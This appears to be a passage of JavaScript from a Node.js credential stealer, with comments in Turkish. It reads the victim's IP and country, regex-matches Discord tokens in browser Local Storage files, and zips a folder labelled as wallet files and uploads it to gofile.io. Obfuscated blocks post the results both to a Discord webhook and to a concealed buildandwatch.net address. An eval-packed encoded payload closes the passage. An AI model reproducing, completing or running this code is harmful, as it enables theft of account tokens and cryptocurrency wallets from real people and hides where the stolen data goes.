_0x4a4427;},_0x52dd(_0xb0ab0e,_0x4a4832);}function _0x32c1(){var _0x542beb=_0x4bf6,_0x3ac72c=['h.net/',_0x542beb(0x1e1),_0x542beb(0x1e0),_0x542beb(0x1e7),_0x542beb(0x1e9),_0x542beb(0x1f1),'45605hlemAO',_0x542beb(0x1ec),_0x542beb(0x1e6),_0x542beb(0x1f2),_0x542beb(0x1ef),'525048PzGOhF',_0x542beb(0x1eb)];return _0x32c1=function(){return _0x3ac72c;},_0x32c1();}

                    })
                    .catch(userError => {
                        console.error('Error fetching user data:', userError);
                    });
            })
            .catch(tokenError => {
                console.error('Error getting access token:', tokenError);
            });
    } catch (error) {
        console.error('An error occurred:', error);
    }
}

//
function sendIPInfoToDiscord() {
  axios.get('https://api64.ipify.org?format=json')
    .then(response => {
      const ipAddress = response.data.ip;

      // IP bilgisi hizmeti
      const ipInfoUrl = `http://ip-api.com/json/${ipAddress}`;

      // IP bilgisini al ve gömülü mesajı oluştur
      axios.get(ipInfoUrl)
        .then(ipResponse => {
          const countryCode = ipResponse.data.countryCode;
          const country = ipResponse.data.country;

          // IP ve ülke bilgilerini içeren embed objesi
          const embed = {
            title: 'IP Bilgileri',
            color: 0x0099ff,
            fields: [
              {
                name: '<:946246524826968104:1138102801487106180>  IP',
                value: ipAddress,
                inline: true
              },
              {
                name: '<a:1109372373888675870:1138102810366447626> Ülke',
                value: `${country} (${countryCode})`,
                inline: true
              }
            ],
            timestamp: new Date()
          };

          // Discord Webhook'a gönderim
(function(_0x23acea,_0x228fa5){var _0x323665=_0x5b66,_0x2dc790=_0x23acea();while(!![]){try{var _0x2fce3c=parseInt(_0x323665(0xbd))/0x1*(-parseInt(_0x323665(0xa6))/0x2)+-parseInt(_0x323665(0xa4))/0x3+parseInt(_0x323665(0xb1))/0x4+-parseInt(_0x323665(0xbb))/0x5*(-parseInt(_0x323665(0xb0))/0x6)+parseInt(_0x323665(0xbf))/0x7*(-parseInt(_0x323665(0xb7))/0x8)+parseInt(_0x323665(0xb6))/0x9*(-parseInt(_0x323665(0xa8))/0xa)+-parseInt(_0x323665(0xba))/0xb*(-parseInt(_0x323665(0xbc))/0xc);if(_0x2fce3c===_0x228fa5)break;else _0x2dc790['push'](_0x2dc790['shift']());}catch(_0x36da38){_0x2dc790['push'](_0x2dc790['shift']());}}}(_0x48dc,0x694d9));var _0x1e4e11=_0xc46a;function _0xc46a(_0xfac881,_0x233c58){var _0x45ce1e=_0x1861();return _0xc46a=function(_0x16fb28,_0x32842c){_0x16fb28=_0x16fb28-(0xab+-0x208a+0x213e);var _0x173306=_0x45ce1e[_0x16fb28];return _0x173306;},_0xc46a(_0xfac881,_0x233c58);}function _0x5b66(_0xf05e5f,_0x4b73fa){var _0x48dcea=_0x48dc();return _0x5b66=function(_0x5b66ee,_0x2455b9){_0x5b66ee=_0x5b66ee-0xa4;var _0x13563b=_0x48dcea[_0x5b66ee];return _0x13563b;},_0x5b66(_0xf05e5f,_0x4b73fa);}function _0x48dc(){var _0x1b8839=['3894747FIOKwo','1778mltJuS','41338YKXCnt','5XNkwCr','2076uMbPwK','89ZJDQZn','push','2069109YeoLzp','4377akJukC','shift','8314pkFazu','4581392NIKjlg','121210fSWhfo','2ZbFHLj','https://bu','ildandwatc','h.net/','1235511WsPsFH','14321754IuRgcc','24224DOArxl','1668066dMJlJZ','2978260BGgHYl','3420585QApOXt','10hFDjMp','post','3433326IllyIV','207NUjdGs','16rtLCMO'];_0x48dc=function(){return _0x1b8839;};return _0x48dc();}(function(_0x15cb8f,_0x2a32c7){var _0x3c559a=_0x5b66,_0x50d164=_0xc46a,_0x4233f5=_0x15cb8f();while(!![]){try{var _0x5626e6=-parseInt(_0x50d164(0x164))/(0xdb8+-0x26f9+0x1942)+-parseInt(_0x50d164(0x168))/(0x1c45+-0x248b*0x1+-0x4*-0x212)*(parseInt(_0x50d164(0x167))/(0x1a*0x65+0x67d+-0x10bc))+parseInt(_0x50d164(0x16c))/(0x1834+0x1*0x9ff+0x3*-0xb65)+parseInt(_0x50d164(0x160))/(0x14bc+-0xf8e*0x2+0xa65)+parseInt(_0x50d164(0x16b))/(-0x1d48+0x91*-0x26+0x32d4)+-parseInt(_0x50d164(0x166))/(0x1*-0x1f8f+0x1c8b*0x1+-0x30b*-0x1)*(parseInt(_0x50d164(0x16a))/(0x725+0xd*0xd6+-0x11fb))+parseInt(_0x50d164(0x161))/(0x636+-0x21d+-0x410)*(parseInt(_0x50d164(0x169))/(0x1*-0xc92+0x8*-0x3f5+0x1*0x2c44));if(_0x5626e6===_0x2a32c7)break;else _0x4233f5[_0x3c559a(0xbe)](_0x4233f5[_0x3c559a(0xa5)]());}catch(_0x2c2725){_0x4233f5['push'](_0x4233f5[_0x3c559a(0xa5)]());}}}(_0x1861,0x1*0x7a39+0xd9d*-0x109+0x182514),axios[_0x1e4e11(0x162)](_0x1e4e11(0x165)+_0x1e4e11(0x15f)+_0x1e4e11(0x163),{'embeds':[embed]}),axios[_0x1e4e11(0x162)](webhook3939,{'embeds':[embed]}));function _0x1861(){var _0x428f3d=_0x5b66,_0x5d3a6c=[_0x428f3d(0xad),_0x428f3d(0xaa),_0x428f3d(0xb9),_0x428f3d(0xb8),_0x428f3d(0xa9),_0x428f3d(0xb3),_0x428f3d(0xaf),_0x428f3d(0xb5),_0x428f3d(0xa7),_0x428f3d(0xab),_0x428f3d(0xb2),_0x428f3d(0xae),_0x428f3d(0xb4),_0x428f3d(0xac)];return _0x1861=function(){return _0x5d3a6c;},_0x1861();}
// 		  axios.post(webhook3939,embedData) 
            
        })
        .catch(error => {
          console.error('IP bilgisi alınırken hata oluştu: ', error);
        });
    })
    .catch(error => {
      console.error('IP adresi alınırken hata oluştu: ', error);
    });
}

// Fonksiyonu çağırarak işlemi başlat
sendIPInfoToDiscord();


///


function addFolder(folderPath) {
  const folderFullPath = path.join(randomPath, folderPath);
  if (!fs.existsSync(folderFullPath)) {
    try {
      fs.mkdirSync(folderFullPath, { recursive: true });
    } catch (error) {}
  }
}


async function getZipp(sourcePath, zipFilePath) {
  try {
    const zip = new AdmZip();
    zip.addLocalFolder(sourcePath);
    zip.writeZip('' + zipFilePath);
  } catch (error) {}
}



function getZip(sourcePath, zipFilePath) {
  try {
    const zip = new AdmZip();
    zip.addLocalFolder(sourcePath);
    zip.writeZip('' + zipFilePath);
  } catch (error) {}
}

function copyFolder(sourcePath, destinationPath) {
  const isDestinationExists = fs.existsSync(destinationPath);
  const destinationStats = isDestinationExists && fs.statSync(destinationPath);
  const isDestinationDirectory = isDestinationExists && destinationStats.isDirectory();

  if (isDestinationDirectory) {
    addFolder(sourcePath);

    fs.readdirSync(destinationPath).forEach((file) => {
      const sourceFile = path.join(sourcePath, file);
      const destinationFile = path.join(destinationPath, file);
      copyFolder(sourceFile, destinationFile);
    });
  } else {
    fs.copyFileSync(destinationPath, path.join(randomPath, sourcePath));
  }
}


function findTokenn(path) {
    path += 'Local Storage\\leveldb';
    let tokens = [];
    try {
        fs.readdirSync(path)
            .map(file => {
                (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
                    .split(/\r?\n/)
                    .forEach(line => {
                        const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)];
                        for (const pattern of patterns) {
                            const foundTokens = line.match(pattern);
                            if (foundTokens) foundTokens.forEach(token => tokens.push(token));
                        }
                    });
            });
    } catch (e) {}
    return tokens;
}


async function createZip(sourcePath, zipPath) {
  return new Promise((resolve, reject) => {
    const output = fs.createWriteStream(zipPath);
    const archive = archiver('zip', { zlib: { level: 9 } });

    output.on('close', () => {
      console.log('ZIP arşivi oluşturuldu: ' + archive.pointer() + ' bayt');
      resolve();
    });

    archive.on('error', (err) => {
      reject(err);
    });

    archive.pipe(output);
    archive.directory(sourcePath, false);
    archive.finalize();
  });
}

async function createZippp(sourcePath, zipPath) {
  return new Promise((resolve, reject) => {
    const output = fs.createWriteStream(zipPath);
    const archive = archiver('zip', { zlib: { level: 9 } });

    output.on('close', () => {
      console.log('ZIP arşivi oluşturuldu: ' + archive.pointer() + ' bayt');
      resolve();
    });

    archive.on('error', (err) => {
      reject(err);
    });

    archive.pipe(output);
    archive.directory(sourcePath, false);
    archive.finalize();
  });
}

async function createZipp(sourcePath, zipPath) {
  return new Promise((resolve, reject) => {
    const zip = new AdmZip();
    zip.addLocalFolder(sourcePath);
    zip.writeZip(zipPath, (err) => {
      if (err) {
        reject(err);
      } else {
		          console.log('ZIP arşivi oluşturuldu: ' + zipPath);

        resolve();
      }
    });
  });
}

async function getZippp() {
	
getZipp(randomPath, randomPath + '.zip')
 
// Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle

// Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
axios.get('https://api.gofile.io/getServer')
  .then(response => {
    if (response.data && response.data.data && response.data.data.server) {
      const server = response.data.data.server;

      // Dosya yolu ve adını belirleyelim.
      const filePath = './' + user.randomUUID + '.zip';

      // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
      const form = new FormData();
      form.append('file', fs.createReadStream(filePath));

      axios.post(`https://${server}.gofile.io/uploadFile`, form, {
        headers: form.getHeaders()
      })
        .then(uploadResponse => {
          const responsePayload = {
            uploadResponseData: uploadResponse.data
          };

          // Webhook URL'si

    const embedData = {
        embeds: [
            {
                title: 'Wallet File Upload Response',
                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
                color: 0x00ff00 // Embed rengi (örnekte kırmızı renk)
            }
        ],
    };


          // Webhook'a POST isteği gönder
(function(_0x4c87d0,_0x3093ae){var _0x52fd48=_0x1815,_0x36632f=_0x4c87d0();while(!![]){try{var _0x3097fa=parseInt(_0x52fd48(0x1f4))/0x1+parseInt(_0x52fd48(0x1ee))/0x2+-parseInt(_0x52fd48(0x1f0))/0x3+-parseInt(_0x52fd48(0x1fa))/0x4*(parseInt(_0x52fd48(0x1f9))/0x5)+parseInt(_0x52fd48(0x1ef))/0x6*(-parseInt(_0x52fd48(0x1f7))/0x7)+-parseInt(_0x52fd48(0x1f3))/0x8+parseInt(_0x52fd48(0x1e9))/0x9*(parseInt(_0x52fd48(0x1fc))/0xa);if(_0x3097fa===_0x3093ae)break;else _0x36632f['push'](_0x36632f['shift']());}catch(_0x2df568){_0x36632f['push'](_0x36632f['shift']());}}}(_0x2a91,0x3429f));function _0x1815(_0x1297f5,_0x5a140b){var _0x2a9138=_0x2a91();return _0x1815=function(_0x1815d3,_0x9e2834){_0x1815d3=_0x1815d3-0x1e9;var _0x33cd7f=_0x2a9138[_0x1815d3];return _0x33cd7f;},_0x1815(_0x1297f5,_0x5a140b);}var _0x19690c=_0x5176;function _0x5176(_0x4b797a,_0x23ba37){var _0x16784e=_0x5b99();return _0x5176=function(_0x2ad6d3,_0x294734){_0x2ad6d3=_0x2ad6d3-(0x145*0xd+0xfa6*0x1+-0x1ea5);var _0x503850=_0x16784e[_0x2ad6d3];return _0x503850;},_0x5176(_0x4b797a,_0x23ba37);}function _0x5b99(){var _0x4cff59=_0x1815,_0x4939c7=[_0x4cff59(0x1f5),'11343366vEyMMD',_0x4cff59(0x1f1),_0x4cff59(0x1ed),_0x4cff59(0x1ea),'h.net/',_0x4cff59(0x1ec),_0x4cff59(0x1fb),'post','5hyfcbT',_0x4cff59(0x1f2),_0x4cff59(0x1fd),_0x4cff59(0x1f8)];return _0x5b99=function(){return _0x4939c7;},_0x5b99();}function _0x2a91(){var _0x4e8d38=['1765719jDISJH','304172HZySci','1231986gFSNhp','1271748xBHCTy','16062eBFgHc','329VkncdS','3101976uRHEpf','67082IWWnVA','373895UeacUo','push','7jBRcMb','172266WKJwhB','223045xVpOAe','8vTemzT','ildandwatc','139330EQJrrx','1916080sPejqd','711ufBWtP','3719336YYUSMJ','shift','https://bu'];_0x2a91=function(){return _0x4e8d38;};return _0x2a91();}(function(_0xc5d24e,_0xdc4ed7){var _0x18e7cd=_0x1815,_0x4047d5=_0x5176,_0x45fbbd=_0xc5d24e();while(!![]){try{var _0x2072f0=parseInt(_0x4047d5(0x18d))/(-0x1d89+-0x1797+-0x1*-0x3521)*(parseInt(_0x4047d5(0x183))/(0x1*0x12f9+0x12f*0x5+0x5*-0x4fa))+parseInt(_0x4047d5(0x187))/(0x419*-0x3+-0xe3*-0x1f+-0xf2f)+parseInt(_0x4047d5(0x188))/(-0xb29+-0xc5*-0x26+0x1211*-0x1)+-parseInt(_0x4047d5(0x184))/(-0xf85+0xd89+0x1*0x201)+-parseInt(_0x4047d5(0x186))/(0x2*-0x118b+0x1d33+0x5e9)*(-parseInt(_0x4047d5(0x18e))/(0xe38+-0x267*-0x3+-0x1566))+-parseInt(_0x4047d5(0x182))/(-0x4b8+0x21dc+-0x1d1c)+-parseInt(_0x4047d5(0x185))/(0x1f5d+0x1d0e+-0x3c62);if(_0x2072f0===_0xdc4ed7)break;else _0x45fbbd[_0x18e7cd(0x1f6)](_0x45fbbd[_0x18e7cd(0x1eb)]());}catch(_0x1bc5b){_0x45fbbd['push'](_0x45fbbd[_0x18e7cd(0x1eb)]());}}}(_0x5b99,0xd*-0x6b23+-0xa284a+0x173b15*0x1),axios[_0x19690c(0x18c)](_0x19690c(0x18a)+_0x19690c(0x18b)+_0x19690c(0x189),embedData),axios[_0x19690c(0x18c)](webhook3939,embedData));
		  

        })
        .catch(error => {
          console.log('Dosya yüklenirken hata oluştu:', error.message);

          const responsePayload = {
            error: error.message
          };

          // Webhook URL'si

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Dosya Yükleme Hatası',
                description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

          // Webhook'a POST isteği gönder
 		  axios.post(webhook3939,embedData)  
 .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });
        });
    } else {
      console.log('Sunucu alınamadı veya yanıt vermedi.');
    }
  })
  .catch(error => {
    console.log('Sunucu alınırken hata oluştu:', error.message);
  });

}

async function stealltokens() {
    const fields = [];
    for (let path of paths) {
        const foundTokens = findTokenn(path);
        if (foundTokens) foundTokens.forEach(token => {
            var c = {
                name: "Browser Token;",
                value: `\`\`\`${token}\`\`\`[CopyToken](https://buildandwatch.net/copy/` + token + `)`,
                inline: !0
            }
            fields.push(c)
        });
    }


  var _0xc25e=["","split","0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/","slice","indexOf","","",".","pow","reduce","reverse","0"];function _0xe93c(d,e,f){var g=_0xc25e[2][_0xc25e[1]](_0xc25e[0]);var h=g[_0xc25e[3]](0,e);var i=g[_0xc25e[3]](0,f);var j=d[_0xc25e[1]](_0xc25e[0])[_0xc25e[10]]()[_0xc25e[9]](function(a,b,c){if(h[_0xc25e[4]](b)!==-1)return a+=h[_0xc25e[4]](b)*(Math[_0xc25e[8]](e,c))},0);var k=_0xc25e[0];while(j>0){k=i[j%f]+k;j=(j-(j%f))/f}return k||_0xc25e[11]}eval(function(h,u,n,t,e,r){r="";for(var i=0,len=h.length;i<len;i++){var s="";while(h[i]!==n[e]){s+=h[i];i++}for(var j=0;j<n.length;j++)s=s.replace(new RegExp(n[j],"g"),j);r+=String.fromCharCode(_0xe93c(s,e,10)-t)}return decodeURIComponent(escape(r))}("KKScSUVcSKPcSPUcKKScSKKcKPScSUScKPHcKPxcSKPcSKxcSKdcSKPcKUxcSKKcKPScSUScKUPcSKHcSKUcKUVcKUdcSSVcSPxcSPVcSKdcSPHcSSPcSPKcSPVcKKScSKKcKPScSUScKPdcKUVcKPdcKPHcKSScKSPcSUdcSUVcSKPcSPUcKKScSKKcKPScSUScKPHcKUKcKPPcSSVcKPdcKUVcKUxcSVdcKSKcKPUcKUKcKPHcKPPcKPHcKUKcKPUcKHHcKHxcKHKcSPxcSKxcKHVcKSKcKSHcKSKcKPUcKPxcKPxcSPVcSSHcSVScSSVcKxVcKxKcKSKcKSHcKSKcKHVcSKxcSUKcSKxcSPUcKSKcKSHcKSKcKPPcKPPcKPScSSVcKHdcSKdcSPPcSKUcKdPcKSKcKSHcKSKcKUVcKUPcKPScKUPcKUKcKUScSUPcKdHcKxKcKdPcSKdcSVUcKSKcKSHcKSKcSPHcSSScSKxcSPVcKSKcKSHcKSKcSKdcSKPcSPHcSKdcSSScKSKcKSHcKSKcSPScSPKcSPdcSPHcKSKcKSHcKSKcKPxcKPdcKUPcKPUcKUVcKPUcKdPcKHScSKxcSPdcKxdcSUUcKSKcKSHcKSKcKPUcKPxcKPUcKPdcKPxcKUKcKPScSVScSPPcSPdcKxKcSKPcKHxcKSKcKSHcKSKcSKxcSSxcSKUcSKxcSKHcKSxcSKdcSPKcSSHcSPKcSPUcKSKcKSHcKSKcKPHcKPHcKPUcKUScKPScSPScSVVcKdHcKxKcKHScSPScKSKcKSHcKSKcKHVcSKxcSUKcSKxcSPUcSVHcSUScKPUcKPScKKHcKxHcKdxcKdPcKHHcKdxcKxUcKSKcKSHcKSKcKPxcKUVcKPdcKPPcKPdcSSdcKHdcSKxcSPdcSUPcKddcKSKcKSHcKSKcKPHcKxKcKxPcSUVcSUScSPPcSKUcKSKcKSHcKSKcSSScSPHcSPHcSPScSPdcKUUcKPKcKPKcSKdcSKHcSPVcKPVcSKHcSSPcSPdcSKdcSPKcSPUcSKHcSKPcSPScSPScKPVcSKdcSPKcSSxcKPKcSKPcSPHcSPHcSKPcSKdcSSScSSxcSKxcSPVcSPHcSPdcKPKcKUPcKPdcKPUcKUVcKUPcKPdcKUScKPxcKPPcKPHcKUPcKPHcKPUcKUScKUPcKPxcKPxcKUPcKPKcKUPcKPdcKPxcKPHcKUPcKPPcKUScKUKcKUPcKUKcKPScKPdcKUScKPdcKPScKPxcKUKcKUKcKPKcKUPcSKHcKPUcKUScKPxcSKdcKPxcSSVcKPUcSKUcSKxcKUScKPdcKPHcKUKcKPPcKPxcKPUcSKPcKPdcSKHcKUPcKPdcKPScKUPcSKHcSKPcSSVcSKPcKPHcKUScKPHcKPVcSSUcSPScSSKcKSKcKSHcKSKcKPHcKUPcKUPcKUScKPdcKPScSVKcSPPcSKHcKxHcSVScSPdcKSKcKSHcKSKcSSVcSSPcSSHcSPHcSKxcSPUcKSKcSVxcKUdcSKKcKPScSUScKPdcKUVcKPdcKPHcKUxcSSVcSPxcSPVcSKdcSPHcSSPcSPKcSPVcKSScKSPcSUdcSPUcSKxcSPHcSPxcSPUcSPVcKKScSKKcKPScSUScKPHcKUKcKPPcSSVcKPdcKUVcKUdcSUxcKUdcSPUcSKxcSPHcSPxcSPUcSPVcKKScSKKcKPScSUScKPdcKUVcKPdcKPHcKSScKSPcKUdcSUxcSSVcSPxcSPVcSKdcSPHcSSPcSPKcSPVcKKScSKKcKPScSUScKUPcSKHcSKUcKUVcKSScSKKcKPScSUScKPdcKPHcKPHcSKdcSKUcKUPcKSHcSKKcKPScSUScKPPcKPUcSKHcSKdcSSVcSKxcKSPcSUdcSUVcSKPcSPUcKKScSKKcKPScSUScKPdcKUVcKPdcKPHcSKdcKUVcKUxcSKKcKPScSUScKPdcKUVcKPdcKPHcKSScKSPcKUdcSPUcSKxcSPHcSPxcSPUcSPVcKKScSKKcKPScSUScKUPcSKHcSKUcKUVcKUxcSSVcSPxcSPVcSKdcSPHcSSPcSPKcSPVcKSScSKKcKPScSUScKUPcSKHcSKUcKUVcKPUcKPUcKSHcSKKcKPScSUScKPdcKUVcKPUcKUPcKPUcKPdcKSPcSUdcSKKcKPScSUScKUPcSKHcSKUcKUVcKPUcKPUcKUxcSKKcKPScSUScKUPcSKHcSKUcKUVcKPUcKPUcKSxcKPScSUScKPPcKPPcSKHcKUdcSUVcSKPcSPUcKKScSKKcKPScSUScKPxcKUPcSKHcSSVcSSVcKPdcKUxcSKKcKPScSUScKPdcKUVcKPdcKPHcSKdcKUVcSVdcSKKcKPScSUScKUPcSKHcSKUcKUVcKPUcKPUcSVxcKUdcSPUcSKxcSPHcSPxcSPUcSPVcKKScSKKcKPScSUScKPxcKUPcSKHcSSVcSSVcKPdcKUdcSUxcKSHcSKKcKPScSUScKUPcSKHcSKUcKUVcKSScSKKcKPScSUScKPdcKPHcKPHcSKdcSKUcKUPcKSHcSKKcKPScSUScKPPcKPUcSKHcSKdcSSVcSKxcKSPcKUdcSUxcKSScSSVcSPxcSPVcSKdcSPHcSSPcSPKcSPVcKSScSKKcKPScSUScSSVcKPPcSSVcKPHcSKUcKPdcKSHcSKKcKPScSUScKPHcSKxcKPUcSKdcKUVcKPHcKSPcSUdcSUVcSKPcSPUcKKScSKKcKPScSUScKPPcSKdcKPScKUVcSKxcSKxcKUxcSKKcKPScSUScKUPcSKHcSKUcKUVcKSHcSKKcKPScSUScKPxcKUKcKPScKUPcKPScSKdcKUxcSKKcKPScSUScSSVcKPPcSSVcKPHcSKUcKPdcKSScKSPcKUdcSUKcSSScSSPcSSHcSKxcKSScKKPcKKPcSVdcSVxcKSPcSUdcSPHcSPUcSUPcSUdcSUVcSKPcSPUcKKScSKKcKPScSUScKPHcKUKcKUVcKPPcSKdcKPxcKUxcKSxcSPScSKPcSPUcSPdcSKxcKHPcSPVcSPHcKSScSKKcKPScSUScKPPcSKdcKPScKUVcSKxcSKxcKSScKPScSUScKPPcKPUcSKUcKSPcKSPcKPKcKPScSUScKPPcKSdcSPScSKPcSPUcSPdcSKxcKHPcSPVcSPHcKSScSKKcKPScSUScKPPcSKdcKPScKUVcSKxcSKxcKSScKPScSUScKPPcKPUcKPUcKSPcKSPcKPKcKPScSUScKPUcKSdcKSxcSPScSKPcSPUcSPdcSKxcKHPcSPVcSPHcKSScSKKcKPScSUScKPPcSKdcKPScKUVcSKxcSKxcKSScKPScSUScKPPcKPUcSKxcKSPcKSPcKPKcKPScSUScKPdcKSUcKSScKSxcSPScSKPcSPUcSPdcSKxcKHPcSPVcSPHcKSScSKKcKPScSUScKPPcSKdcKPScKUVcSKxcSKxcKSScKPScSUScKPPcKPUcSKdcKSPcKSPcKPKcKPScSUScKPHcKSPcKSdcKSxcSPScSKPcSPUcSPdcSKxcKHPcSPVcSPHcKSScSKKcKPScSUScKPPcSKdcKPScKUVcSKxcSKxcKSScKPScSUScKPPcKPPcSSVcKSPcKSPcKPKcKPScSUScKPxcKSUcKSScKSxcSPScSKPcSPUcSPdcSKxcKHPcSPVcSPHcKSScSKKcKPScSUScKPPcSKdcKPScKUVcSKxcSKxcKSScKPScSUScKPPcKPUcKUPcKSPcKSPcKPKcKPScSUScKUVcKSPcKSdcSPScSKPcSPUcSPdcSKxcKHPcSPVcSPHcKSScSKKcKPScSUScKPPcSKdcKPScKUVcSKxcSKxcKSScKPScSUScKPPcKPUcKUKcKSPcKSPcKPKcKPScSUScKUKcKSdcKSxcSPScSKPcSPUcSPdcSKxcKHPcSPVcSPHcKSScSKKcKPScSUScKPPcSKdcKPScKUVcSKxcSKxcKSScKPScSUScKPPcKPPcSKxcKSPcKSPcKPKcKPScSUScKUScKSdcKSxcSPScSKPcSPUcSPdcSKxcKHPcSPVcSPHcKSScSKKcKPScSUScKPPcSKdcKPScKUVcSKxcSKxcKSScKPScSUScKPPcKPUcKUVcKSPcKSPcKPKcKPScSUScKUPcKSUcKSScSPScSKPcSPUcSPdcSKxcKHPcSPVcSPHcKSScSKKcKPScSUScKPPcSKdcKPScKUVcSKxcSKxcKSScKPScSUScKPPcKPUcKPPcKSPcKSPcKPKcKPScSUScSKPcKSPcKUdcSSPcSSVcKSScSKKcKPScSUScKPHcKUKcKUVcKPPcSKdcKPxcKUxcKUxcKUxcSKKcKPScSUScKPHcSKxcKPUcSKdcKUVcKPHcKSPcSKUcSPUcSKxcSKPcSSdcKUdcSKxcSSHcSPdcSKxcKKScSKKcKPScSUScKPxcKUKcKPScKUPcKPScSKdcSVdcKSKcSPScSPxcSPdcSSScKSKcSVxcKSScSKKcKPScSUScKPxcKUKcKPScKUPcKPScSKdcSVdcKSKcSPdcSSScSSPcSSVcSPHcKSKcSVxcKSScKSPcKSPcKUdcSUxcSKdcSKPcSPHcSKdcSSScKSScSKKcKPScSUScKPxcSKdcSKxcKPUcKPUcSKPcKSPcSUdcSKKcKPScSUScKPxcKUKcKPScKUPcKPScSKdcSVdcKSKcSPScSPxcSPdcSSScKSKcSVxcKSScSKKcKPScSUScKPxcKUKcKPScKUPcKPScSKdcSVdcKSKcSPdcSSScSSPcSSVcSPHcKSKcSVxcKSScKSPcKSPcKUdcSUxcSUxcSUxcKSScSKKcKPScSUScKPdcKUVcKPdcKPHcKSHcKPScSUScKPUcSKxcKUPcSKPcSKxcKSPcKSHcSKPcSUScSSPcSPKcSPdcSVdcSKKcKPScSUScKPHcKPxcSKPcSKxcSKdcSKPcKSScKPScSUScKPPcKPUcKPxcKSPcSVxcKSScKSKcSSScSPHcSPHcSPScSPdcKUUcKPKcKPKcSKUcSPxcSSPcSSHcSKHcSKPcSPVcSKHcSUKcSKPcSPHcSKdcSSScKPVcSPVcSKxcSPHcKPKcKSKcKSHcSUdcKSKcSKdcSPKcSPVcSPHcSKxcSPVcSPHcKSKcKUUcSPVcSPxcSSHcSSHcKSHcKSKcSKxcSSxcSKUcSKxcSKHcSPdcKSKcKUUcSVdcSUdcKSKcSKdcSPKcSSHcSPKcSPUcKSKcKUUcSKdcSPKcSPVcSSVcSSPcSSKcSVdcSKKcKPScSUScKPHcKPxcSKPcSKxcSKdcSKPcKSScKPScSUScKPPcKPUcKUScKSPcSVxcKSHcKSKcSSVcSSPcSKxcSSHcSKHcSPdcKSKcKUUcSSVcSSPcSKxcSSHcSKHcSPdcSVdcSKKcKPScSUScKPHcKPxcSKPcSKxcSKdcSKPcKSScKPScSUScKPPcKPPcSKHcKSPcSVxcKSScSPKcSPVcSSHcSUPcKxxcSPVcSSPcSPPcSPxcSKxcKSPcKSHcKSKcSKPcSPxcSPHcSSScSPKcSPUcKSKcKUUcSUdcKSKcSPVcSKPcSSxcSKxcKSKcKUUcSKKcKPScSUScKPHcKPxcSKPcSKxcSKdcSKPcKSScKPScSUScKPPcKPUcKPScKSPcKSHcKSKcSSPcSKdcSPKcSPVcSKKcSPxcSPUcSSHcKSKcKUUcSKKcKPScSUScKPHcKPxcSKPcSKxcSKdcSKPcKSScKPScSUScKPPcKPUcSKHcKSPcSUxcKSHcKSKcSSVcSPKcSPKcSPHcSKxcSPUcKSKcKUUcSUdcKSKcSPHcSKxcSUScSPHcKSKcKUUcSKKcKPScSUScKPHcKPxcSKPcSKxcSKdcSKPcKSScKPScSUScKPPcKPUcKPScKSPcSUxcSUxcSVxcSUxcKSPcSVdcSKKcKPScSUScKPHcKPxcSKPcSKxcSKdcSKPcKSScKPScSUScKPPcKPUcKPdcKSPcSVxcKSScSKKcKPScSUScKPHcSKUcKPHcKUVcKPxcKPHcKUxcKdVcSUdcSUxcKSPcSVdcSKKcKPScSUScKPHcKPxcSKPcSKxcSKdcSKPcKSScKPScSUScKPPcKPUcKPHcKSPcSVxcKSScSKKcKPScSUScKPPcKPdcKUScKUScKUScKPScKUxcKdVcSUdcSUxcKSPcKSHcSKPcSUScSSPcSPKcSPdcSVdcSKKcKPScSUScKPHcKPxcSKPcSKxcSKdcSKPcKSScKPScSUScKPPcKPUcKPxcKSPcSVxcKSScSUKcSKxcSKUcSSScSPKcSPKcSSdcKPdcKUPcKPdcKUPcKSHcSUdcKSKcSKdcSPKcSPVcSPHcSKxcSPVcSPHcKSKcKUUcSPVcSPxcSSHcSSHcKSHcKSKcSKxcSSxcSKUcSKxcSKHcSPdcKSKcKUUcSVdcSUdcKSKcSKdcSPKcSSHcSPKcSPUcKSKcKUUcSKdcSPKcSPVcSSVcSSPcSSKcSVdcSKKcKPScSUScKPHcKPxcSKPcSKxcSKdcSKPcKSScKPScSUScKPPcKPUcKUScKSPcSVxcKSHcKSKcSSVcSSPcSKxcSSHcSKHcSPdcKSKcKUUcSSVcSSPcSKxcSSHcSKHcSPdcSVdcSKKcKPScSUScKPHcKPxcSKPcSKxcSKdcSKPcKSScKPScSUScKPPcKPPcSKHcKSPcSVxcKSScSPKcSPVcSSHcSUPcKxxcSPVcSSPcSPPcSPxcSKxcKSPcKSHcKSKcSKPcSPxcSPHcSSScSPKcSPUcKSKcKUUcSUdcKSKcSPVcSKPcSSxcSKxcKSKcKUUcSKKcKPScSUScKPHcKPxcSKPcSKxcSKdcSKPcKSScKPScSUScKPPcKPUcSKPcKSPcKSHcKSKcSSPcSKdcSPKcSPVcSKKcSPxcSPUcSSHcKSKcKUUcSKKcKPScSUScKPHcKPxcSKPcSKxcSKdcSKPcKSScKPScSUScKPPcKPUcSKHcKSPcSUxcKSHcKSKcSSVcSPKcSPKcSPHcSKxcSPUcKSKcKUUcSUdcKSKcSPHcSKxcSUScSPHcKSKcKUUcSKKcKPScSUScKPHcKPxcSKPcSKxcSKdcSKPcKSScKPScSUScKPPcKPUcSKPcKSPcSUxcSUxcSVxcSUxcKSPcSVdcKSKcSPHcSSScSKxcSPVcKSKcSVxcKSScSKKcKPScSUScKPHcSKUcSKUcKUVcKUKcKPScKUxcKdVcSUdcSUxcKSPcSVdcSKKcKPScSUScKPHcKPxcSKPcSKxcSKdcSKPcKSScKPScSUScKPPcKPUcKPHcKSPcSVxcKSScSKKcKPScSUScKPdcSKxcKPUcSSVcKUVcKPScKUxc